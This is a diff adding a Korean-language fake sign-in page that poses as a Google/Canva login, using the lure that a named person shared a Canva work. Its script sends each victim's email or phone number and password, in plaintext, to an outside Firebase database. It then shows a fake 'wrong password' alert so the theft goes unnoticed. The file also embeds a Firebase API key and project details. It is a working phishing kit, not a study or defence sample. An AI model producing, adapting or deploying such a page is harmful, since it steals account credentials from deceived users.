@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인</title>
+    <link rel="stylesheet" href="google.css">
+</head>
+<body>
+
+    <div class="box">
+        <div class="logo">
+            <!-- 로고 이미지 추가 -->
+            <img src="logo.png" alt="로고" class="logo-img">
+        </div>
+        
+        <h2>로그인</h2>
+        <p>"박범서"님이 Canva에서 작품을 공유했어요.</p>
+        
+        <form onsubmit="return false;">
+            <!-- 이메일 입력란 -->
+            <div class="inputBox">
+                <input type="text" id="email" required onkeyup="this.setAttribute('value', this.value);" value="">
+                <label>이메일 또는 전화번호</label>
+            </div>
+            
+            <!-- 비밀번호 입력란 -->
+            <div class="inputBox">
+                <input type="password" id="password" required onkeyup="this.setAttribute('value', this.value);" value="">
+                <label>비밀번호</label>
+            </div>
+            
+            <input type="submit" value="다음" onclick="saveData()">
+        </form>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase 설정 및 데이터 저장 함수
+        const firebaseConfig = {
+            apiKey: "AIzaSyAj_uIok3KmX3Nv2G8Fbhv8G_7KOwcSPQA",
+            authDomain: "pullupjahsinfoalpha.firebaseapp.com",
+            databaseURL: "https://pullupjahsinfoalpha-default-rtdb.firebaseio.com",
+            projectId: "pullupjahsinfoalpha",
+            storageBucket: "pullupjahsinfoalpha.firebasestorage.app",
+            messagingSenderId: "736104212458",
+            appId: "1:736104212458:web:51cf614f32070ce73b7493",
+            measurementId: "G-Q3F72FVZ70"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function saveData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email.trim() !== "" && password.trim() !== "") {
+                // Firebase에 데이터 저장
+                database.ref('users/').push({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                })
+                .then(() => {
+                    alert(email + '님의 비밀번호 또는 이메일이 잘못되었습니다.');
+                    document.getElementById('email').value = "";
+                    document.getElementById('password').value = "";
+                })
+                .catch((error) => {
+                    console.error(error);
+                    alert('저장 실패!');
+                });
+            } else {
+                alert('이메일/전화번호와 비밀번호를 모두 입력하세요!');
+            }
+        }
+    </script>
+
+</body>
+</html>
